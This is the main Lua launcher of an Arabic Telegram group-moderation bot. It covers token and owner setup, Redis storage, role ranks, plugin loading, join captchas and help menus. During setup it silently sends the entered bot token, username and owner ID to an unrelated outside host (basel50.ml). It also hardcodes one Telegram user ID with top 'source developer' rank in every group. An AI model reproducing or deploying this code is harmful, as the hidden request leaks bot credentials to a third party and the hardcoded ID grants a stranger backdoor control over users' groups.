local inspect = (loadfile "./libs/inspect.lua")()
Er_ssl   , https = pcall(require, "ssl.https")
Er_http  , http  = pcall(require, "socket.http")
http.TIMEOUT = 5
JSON   = (loadfile "./libs/json.lua")()
redis  = (loadfile "./libs/redis.lua")()
URL    = (loadfile "./libs/url.lua")()
Er_utf8  , utf8  = pcall(require, "lua-utf8")
redis = redis.connect('127.0.0.1',6379)


if not Er_ssl then
print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
os.exit()
end

if not Er_utf8 then
print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
os.exit()
end

function create_config(Token)
if not Token then
io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
Token = io.read():gsub(' ','')
if Token == '' then
print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
create_config()
end
Api_Token = 'https://api.telegram.org/bot'..Token
local url , res = https.request(Api_Token..'/getMe')
if res ~= 200 then
print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
create_config()
end
local GetToken = JSON.decode(url)
BOT_NAME = GetToken.result.first_name
BOT_User = "@"..GetToken.result.username
io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
end

io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your ID SUDO : \27[0;39;49m')
SUDO_USER = io.read():gsub(' ','')
if SUDO_USER == '' then
print('\n\27[1;31m￤ You Did not Enter ID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
create_config(Token)
end 
if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
create_config(Token)
end 
print('('..SUDO_USER..')')
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
print(res)
if res ~= 200 then
print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
os.exit()
end
success, GetUser = pcall(JSON.decode, url)
if not success then
print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
os.exit()
end
if GetUser.ok == false then
print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلايدي , تآگد مـنهہ‏‏ جيدآ  !')
create_config(Token)
end 
GetUser.result.username = GetUser.result.username or GetUser.result.first_name
print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس فواز الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
boss = Token:match("(%d+)")
redis:mset(
boss..":VERSION","1.2",
boss..":SUDO_ID:",SUDO_USER,
boss..":DataCenter:","Amsterdam",
boss..":UserNameBot:",BOT_User,
boss..":ApiSource","SourceShahad",
boss..":NameBot:","شهد",
"TH3BOSS_INSTALL","Yes"
)
redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
info = {} 
info.namebot = BOT_NAME
info.userbot = BOT_User
info.id = SUDO_USER
info.token = Token
info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = " اهلا عزيزي[المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس شهد \n أرســل  الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
local CmdRun = [[
rm -f ./README.md
rm -rf ./.git
chmod +x ./run
cp -a ../BOSS ../]]..BOT_User..[[ &&
rm -fr ~/BOSS
../]]..BOT_User..[[/run
]]
print(CmdRun)
os.execute(CmdRun)
end

function Start_Bot() 
local TokenBot = io.open('./inc/Token.txt', "r")
if not TokenBot then
print('\27[0;33m>>'..[[




▀█████████▄   ▄██████▄     ▄████████    ▄████████
███    ███ ███    ███   ███    ███   ███    ███
███    ███ ███    ███   ███    █▀    ███    █▀
▄███▄▄▄██▀  ███    ███   ███          ███
▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @GMBOTS
███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
███    ███ ███    ███    ▄█    ███    ▄█    ███
▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source The3Boss
---------------------------------------------------------------------
]]..'\027[0;32m')
create_config()
else
Token = TokenBot:read('*a')
File = {}
local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
boss = Token:match("(%d+)")
our_id = tonumber(boss)
ApiBoss = redis:get(boss..":ApiSource")
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(boss..":UserNameBot:")
SUDO_ID = tonumber(redis:get(boss..":SUDO_ID:"))
if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
version = redis:get(boss..":VERSION")
DataCenter = redis:get(boss..":DataCenter:")

local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run inc/functions.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/functions.lua"):read('*all')))
end

local ok, ERROR =  pcall(function() loadfile("./inc/locks.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run inc/locks.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
end

print('\27[0;33m>>'..[[






▀█████████▄   ▄██████▄     ▄████████    ▄████████ 
███    ███ ███    ███   ███    ███   ███    ███ 
███    ███ ███    ███   ███    █▀    ███    █▀  
▄███▄▄▄██▀  ███    ███   ███          ███        
▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @GMBOTS
███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
███    ███ ███    ███    ▄█    ███    ▄█    ███ 
▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ VERSION » v]]..version..[[

-------------------------------------------------------------------

]]..'\027[0;32m'
..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..boss..')\027[0;32m\n'
..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
..'¦ Api_Src->: \27[1;34m'..ApiBoss..'\027[0;32m\n'
..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
..'======================================\27[0;33m\27[0;31m'
)
local Twer = io.popen('mkdir -p plugins'):read("*all")
end
local ok, i =  pcall(function() ScriptFile = loadfile("./inc/Script.lua")() end)
if not ok then  
print('\27[31m! Error File Not "Run inc/Script.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/Script.lua"):read('*all')))
end
print("\027[0;32m=======[ ↓↓ List For Files ↓↓ ]=======\n\27[0;33m")
local Num = 0
for Files in io.popen('ls plugins'):lines() do
if Files:match(".lua$") then
Num = Num + 1
local ok, i =  pcall(function() File[Files] = loadfile("plugins/"..Files)() end)
if not ok then
print('\27[31mError loading plugins '..Files..'\27[39m')
print(tostring(io.popen("lua plugins/"..Files):read('*all')))
else
print("\27[0;36m "..Num.."- "..Files..'\27[m')
end 
end 
end
print('\n\27[0;32m¦ All Files is : '..Num..' Are Active.\n--------------------------------------\27[m\n')
end
Start_Bot()
function CheckBotA(msg)
return false
end
function input_inFo(msg)
if not msg.forward_info_ and msg.is_channel_post_ then
StatusLeft(msg.chat_id_,our_id)
return false
end
if msg.sender_user_id_ == our_id then
return false
end
if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
msg.type = GetType(msg.chat_id_)
if msg.type == "pv" and redis:get(boss..':mute_pv:'..msg.sender_user_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end
if msg.type ~= "pv" and redis:get(boss..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
print("\27[1;31mThis Flood Sender ...\27[0")
Del_msg(msg.chat_id_,msg.id_)
return false
end
if redis:get(boss..'group:add'..msg.chat_id_) then 
msg.GroupActive = true
else
msg.GroupActive = false
end

--[[if msg.GroupActive then 
if (msg.content_.ID == "MessagePhoto" 
or msg.content_.ID == "MessageSticker" 
or msg.content_.ID == "MessageVoice" 
or msg.content_.ID == "MessageAudio" 
or msg.content_.ID == "MessageVideo" 
or msg.content_.ID == "MessageAnimation" 
or msg.content_.ID == "MessageUnsupported") 
and redis:get(boss.."lock_cleaner"..msg.chat_id_) then
--print("Clener >>> ")
redis:sadd(boss..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = redis:get(boss..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
redis:setex(boss..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end



print(boss..":IdsMsgsCleaner:"..msg.chat_id_)
local Cleaner = redis:smembers(boss..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not redis:get(boss..":SetTimerCleaner:"..msg.chat_id_..v) then
Del_msg(msg.chat_id_,v)
redis:srem(boss..":IdsMsgsCleaner:"..msg.chat_id_,v)
--print("MSG DELET CLEANER : "..v)
else
--print("MSG List CLEANER : "..v.." : Lodding ...")
end
end




end--]]

if msg.content_.ID == "MessageChatDeleteMember" then 
if msg.GroupActive and redis:get(boss..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
end
return false 
end 

if msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486 then 
msg.TheRankCmd = 'مطور السورس'
msg.TheRank = 'مطور السورس'
msg.Rank = 1
elseif msg.sender_user_id_ == SUDO_ID then 
msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Master' 
msg.Rank = 1
elseif redis:sismember(boss..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'المطور'
msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'Myth'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(boss..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
msg.Rank = 11
elseif msg.GroupActive and redis:sismember(boss..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك'
msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك '
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(boss..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(boss..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(boss..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRank = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
msg.Rank = 6
elseif msg.sender_user_id_ == our_id then
msg.Rank = 7
else
msg.TheRank = 'عضو'
msg.Rank = 10 
end

if msg.Rank == 1 then
msg.SudoBase = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 11 then
msg.SuperCreator = true
msg.Creator = true
msg.Admin = true
msg.Director = true
end
if msg.Rank == 1 or msg.Rank == 2 then
msg.SudoUser = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 then
msg.Creator = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 then
msg.Director = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 then
msg.Admin = true
end
if msg.Rank == 6 then
msg.Special = true
end
if msg.Rank == 7 then
msg.OurBot = true
end
ISONEBOT = false
if msg.content_.ID == "MessageChatAddMembers" then
local lock_bots = redis:get(boss..'lock_bots'..msg.chat_id_)
ZISBOT = false
for i=0,#msg.content_.members_ do
if msg.content_.members_[i].type_.ID == "UserTypeBot" then
ISONEBOT = true
if msg.GroupActive and not msg.Admin and lock_bots then 
ZISBOT = true
kick_user(msg.content_.members_[i].id_, msg.chat_id_)
end
end
end
if msg.GroupActive and ZISBOT and redis:get(boss..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(boss..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
text = [[*اهلين انا ]]..redis:get(boss..':NameBot:')..[[ 🧚*

↞ اختصاصي ادارة المجموعات من السبام والخ..
↞ كت تويت, يوتيوب , واشياء كثير ..
↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.



]]
local inline = {{{text="للاستفسارات",url="t.me/"..xsudouser}}}
send_keyPhoto(msg.chat_id_,text,nil,inline,msg.id_)
return false
end
if not ISONEBOT then
msg.adduser = msg.content_.members_[0].id_
msg.addusername = msg.content_.members_[0].username_
msg.addname = msg.content_.members_[0].first_name_
msg.adduserType = msg.content_.members_[0].type_.ID
end
end
if msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatJoinByLink" then 
if msg.GroupActive then
if msg.content_.ID == "MessageChatAddMembers" then
Senderid = msg.content_.members_[0].id_
else
Senderid = msg.sender_user_id_
end
if not msg.Special and not msg.Admin and redis:get(boss.."lock_Add"..msg.chat_id_) then

kick_user(Senderid, msg.chat_id_,function(arg,data)
StatusLeft(msg.chat_id_,Senderid)
end)

end

if redis:get(boss..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
else
if redis:get(boss.."lock_check"..msg.chat_id_) and not redis:get(boss..":TqeedUser:"..msg.chat_id_..Senderid) then
local text = "⇜ اهلين قيدناك عشان نتاكد انك شخص حقيقي اضغط الزر اللي تحت ياحلو"
local inline = {{{text="انا شخص حقيقي",callback_data="CheckRobotJoin:"..Senderid}}}
Restrict(msg.chat_id_,Senderid,1)
return send_inline(msg.chat_id_,text,inline,msg.id_)
end
end
end
if ISONEBOT then return false end
end

-- [[ المحظورين عام ]]
if GeneralBanned((msg.adduser or msg.sender_user_id_)) then
print('\27[1;31m is_G_BAN_USER\27[0m')
Del_msg(msg.chat_id_,msg.id_)
kick_user((msg.adduser or msg.sender_user_id_),msg.chat_id_)
return false 
end

--[[ المكتومين ]]
if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
if msg.Admin then redis:srem(boss..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
print("\27[1;31m User is Silent\27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end

--[[ المحظورين ]]
if msg.GroupActive and Check_Banned(msg.chat_id_,(msg.adduser or msg.sender_user_id_)) then
if msg.Special then redis:srem(boss..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
print('\27[1;31m is_BANED_USER\27[0m')
Del_msg(msg.chat_id_, msg.id_)
kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
return false 
end

if msg.GroupActive and not msg.Admin then
if redis:get(boss..'mute_text'..msg.chat_id_) then --قفل الدردشه
print("\27[1;31m Chat is Mute \27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end
if msg.content_.ID == "MessageText" then
Type_id = msg.content_.text_
elseif msg.content_.ID == 'MessagePhoto' then
if msg.content_.photo_.sizes_[3] then Type_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ else Type_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ end
elseif msg.content_.ID == "MessageSticker" then
Type_id = msg.content_.sticker_.sticker_.persistent_id_
elseif msg.content_.ID == "MessageVoice" then
Type_id = msg.content_.voice_.voice_.persistent_id_
elseif msg.content_.ID == "MessageAnimation" then
Type_id = msg.content_.animation_.animation_.persistent_id_
elseif msg.content_.ID == "MessageVideo" then
Type_id = msg.content_.video_.video_.persistent_id_
elseif msg.content_.ID == "MessageAudio" then
Type_id = msg.content_.audio_.audio_.persistent_id_
else
Type_id = 0
end

if FilterX(msg,Type_id) then --[[ الكلمات الممنوعه ]]
return false
end 
end 

if ScriptFile and ScriptFile.Boss then 
if msg.text and ScriptFile.iBoss then
XBoss = ScriptFile.Boss
local list = redis:hgetall(boss..":AwamerBotArray:"..msg.chat_id_)
for Boss2,k in pairs(list) do
Text = msg.text
Text2 = k
if Text:match(Boss2) then 
local amrr = {Text:match(Boss2)}
local AmrOld = redis:hgetall(boss..":AwamerBotArray2:"..msg.chat_id_)
amrnew = "" amrold = ""
for Amor,ik in pairs(AmrOld) do
if Text2:match(ik) then	
if amrr[1] == Amor then
amrnew = Amor ; amrold = ik   
end end end
Text = Text:gsub(amrnew,amrold)
AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
print("___________"..Text2.."__________")
GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
if GetMsg then
print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
end
for k, Boss in pairs(XBoss) do
Text = msg.text
Text = Text:gsub("ی","ي")
Text = Text:gsub("ک","ك")
Text = Text:gsub("ه‍","ه")
if Text:match(Boss) then -- Check Commands To admin
AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
end
end  --- End iBoss
--[[
if msg.text and utf8.len(msg.text) > 300 then
msg.text = "n"
end
--]]
if ScriptFile.dBoss then
if ScriptFile.dBoss(msg) == false then
return false
end
print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
end

for name,Plug in pairs(File) do
if Plug.Boss then 
if msg.text and Plug.iBoss then
for k, Boss in pairs(Plug.Boss) do
if msg.text:match(Boss) then
local GetMsg = Plug.iBoss(msg,{msg.text:match(Boss)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
end
end
if Plug.dBoss then
Plug.dBoss(msg)
print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
end
else
print("The File "..name.." Not Runing in The Source Boss")
end 

end
else
print("The File Script.lua Not Runing in The Source Casper")
end
end

function tdcli_update_callback(data)
local msg = data.message_
if data.ID == "UpdateMessageSendFailed" then 
if msg and msg.sender_user_id_ then
redis:srem(boss..'users',msg.sender_user_id_)
end
elseif data.ID == "UpdateNewCallbackQuery" then
local datab = data.payload_.data_ 
local UserID = data.sender_user_id_
local dataid = data.message_id_
local ChatID = data.chat_id_
local IQ_ABS = data.message_id_/2097152/0.5
local abbas = data.payload_.data_ 
local function strSplit(str,delim)
    local t = {}

    for substr in string.gmatch(str, "[^".. delim.. "]*") do
        if substr ~= nil and string.len(substr) > 0 then
            table.insert(t,substr)
        end
    end

    return t
end
local Text,UserJoin = datab:match("^(CheckRobotJoin:)(%d+)$")
local UserJoin = tonumber(UserJoin)
if Text == "CheckRobotJoin:" then
local Adminn = false
if UserID == SUDO_ID then 
Adminn = true
elseif redis:sismember(boss..':SUDO_BOT:',UserID) then 
Adminn = true
elseif redis:sismember(boss..':MONSHA_BOT:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(boss..':MONSHA_Group:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(boss..'owners:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(boss..'admins:'..ChatID,UserID) then 
Adminn = true
elseif UserID == UserJoin then 
Adminn = true
end	
if Adminn then
Restrict(ChatID,UserJoin,2)
answerCallbackQuery(data.id_,"⇜ تم فك التقييد بنجاح و التأكد بانك مو زومبي️",true)
EditMsg(ChatID,dataid,"⇜ تم فك التقييد بنجاح والتأكد بانك مو زومبي️")
else
answerCallbackQuery(data.id_,"⇜ عذرا انت مو الشخص المقيد او مامعك لديك صلاحيه الادارة , اسفين ",true)	
end

else
--	answerCallbackQuery(data.id_,"امر غير معرف",true)
end
print(inspect(data))
if abbas == '/HelpList1'..UserID then

SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[
* للاستفسار -* []]..SUDO_USER..[[]


*❨ اوامر الرفع والتنزيل ❩*

⌯ رفع ↣ ↢ تنزيل مشرف
⌯ رفع ↣ ↢ تنزيل مالك اساسي
⌯ رفع ↣ ↢ تنزيل مالك
⌯ رفع ↣ ↢ تنزيل مدير
⌯ رفع ↣ ↢ تنزيل ادمن
⌯ رفع ↣ ↢ تنزيل مميز
⌯ تنزيل الكل  ↢ بالرد  ↢ لتنزيل الشخص من جميع رتبه
⌯ تنزيل الكل  ↢ بدون رد  ↢ لتنزيل كل رتب المجموعة

*❨ اوامر المسح ❩*

⌯ مسح المالكيين الاساسيين
⌯ مسح المالكيين
⌯ مسح المدراء
⌯ مسح الادمنيه
⌯ مسح المميزين
⌯ مسح المحظورين
⌯ مسح المكتومين
⌯ مسح قائمة المنع
⌯ مسح رتبه
⌯ مسح الرتب
⌯ مسح الردود
⌯ مسح الاوامر
⌯ مسح + العدد
⌯ مسح بالرد
⌯ مسح الترحيب
⌯ مسح الرابط
⌯ مسح قائمة التثبيت

*❨ اوامر الطرد الحظر الكتم ❩*

⌯ حظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ طرد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ كتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ تقيد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء الحظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء الكتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء التقييد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ رفع القيود ↢ لحذف الكتم,الحظر,التقييد
⌯ منع الكلمة
⌯ منع بالرد على قيف او ستيكر
⌯ الغاء منع الكلمة
⌯ طرد البوتات
⌯ طرد المحذوفين
⌯ كشف البوتات

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="م3",callback_data="/HelpList3"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},
{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
{{text="رجوع",callback_data="/HelpList"..UserID}}
} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 

if abbas == '/HelpList2'..UserID then

SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[
* للاستفسار -* []]..SUDO_USER..[[]


*❨ اوامر الوضع ❩*

⌯ وضع ترحيب
⌯ وضع قوانين
⌯ وضع وصف
⌯ وضع رابط
⌯ اضف امر
⌯ تغيير رتبه

*❨ اوامر رؤية الاعدادات ❩*

⌯ المطورين
⌯ المالكيين الاساسيين
⌯ المالكيين 
⌯ الادمنيه
⌯ المدراء
⌯ المميزين
⌯ المحظورين
⌯ القوانين
⌯ قائمه المنع
⌯ المكتومين
⌯ المطور 
⌯ معلوماتي 
⌯ الحمايه  
⌯ الوسائط
⌯ الاعدادت
⌯ المجموعه
⌯ الساعه
⌯ التاريخ

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="م3",callback_data="/HelpList3"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},
{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
{{text="رجوع",callback_data="/HelpList"..UserID}}
} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 



if abbas == '/HelpList3'..UserID then
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[
* للاستفسار -* []]..SUDO_USER..[[]


*❨ اوامر الردود ❩*

⌯ الردود ↢ تشوف كل الردود المضافه
⌯ اضف رد ↢ عشان تضيف رد
⌯ مسح رد ↢ عشان تمسح الرد
⌯ مسح الردود ↢ تمسح كل الردود
-
⌯ الردود العشوائية ↢ تشوف كل الردود العشوائية المضافه
⌯ اضف رد عشوائي ↢ عشان تضيف كلمة لها اكثر من رد
⌯ مسح رد عشوائي ↢ عشان تمسح رد عشوائي
⌯ مسح الردود العشوائية ↢ تمسح كل الردود العشوائية

*❨ اوامر القفل والفتح بالمسح ❩*

⌯ قفل ↣ ↢ فتح  التعديل  
⌯ قفل ↣ ↢ فتح  البصمات 
⌯ قفل ↣ ↢ فتح  الفيديو 
⌯ قفل ↣ ↢ فتح  الـصــور 
⌯ قفل ↣ ↢ فتح  الملصقات 
⌯ قفل ↣ ↢ فتح  الملفات  
⌯ قفل ↣ ↢ فتح  المتحركه 
⌯ قفل ↣ ↢ فتح  الدردشه 
⌯ قفل ↣ ↢ فتح  الروابط 
⌯ قفل ↣ ↢ فتح  الهاشتاق 
⌯ قفل ↣ ↢ فتح  البوتات 
⌯ قفل ↣ ↢ فتح  المعرفات 
⌯ قفل ↣ ↢ فتح  البوتات بالطرد 
⌯ قفل ↣ ↢ فتح  الاشعارات 
⌯ قفل ↣ ↢ فتح  الكلايش 
⌯ قفل ↣ ↢ فتح  التكرار 
⌯ قفل ↣ ↢ فتح  التوجيه 
⌯ قفل ↣ ↢ فتح  الانلاين 
⌯ قفل ↣ ↢ فتح  الجهات 
⌯ قفل ↣ ↢ فتح  الــكـــل 
⌯ قفل ↣ ↢ فتح  السب
⌯ قفل ↣ ↢ فتح  الفارسيه
⌯ قفل ↣ ↢ فتح  الانجليزيه
⌯ قفل ↣ ↢ فتح  الاضافه
⌯ قفل ↣ ↢ فتح  الصوت
⌯ قفل ↣ ↢ فتح  الالعاب
⌯ قفل ↣ ↢ فتح  الماركدوان
⌯ قفل ↣ ↢ فتح  الويب

*❨ اوامر الفتح والقفل بالتقييد ❩*

⌯ قفل ↣ ↢ فتح التوجيه بالتقييد 
⌯ قفل ↣ ↢ فتح الروابط بالتقييد 
⌯ قفل ↣ ↢ فتح المتحركه بالتقييد 
⌯ قفل ↣ ↢ فتح الصور بالتقييد 
⌯ قفل ↣ ↢ فتح الفيديو بالتقييد 

*❨ اوامر التفعيل والتعطيل ❩*

⌯ تفعيل ↣ ↢ تعطيل الترحيب 
⌯ تفعيل ↣ ↢ تعطيل الاشتراك
⌯ تفعيل ↣ ↢ تعطيل الردود 
⌯ تفعيل ↣ ↢ تعطيل التحذير 
⌯ تفعيل ↣ ↢ تعطيل الايدي
⌯ تفعيل ↣ ↢ تعطيل الرابط
⌯ تفعيل ↣ ↢ تعطيل اطردني
⌯ تفعيل ↣ ↢ تعطيل الحظر
⌯ تفعيل ↣ ↢ تعطيل الحمايه
⌯ تفعيل ↣ ↢ تعطيل المنشن
⌯ تفعيل ↣ ↢ تعطيل الايدي بالصوره
⌯ تفعيل ↣ ↢ تعطيل التحقق 
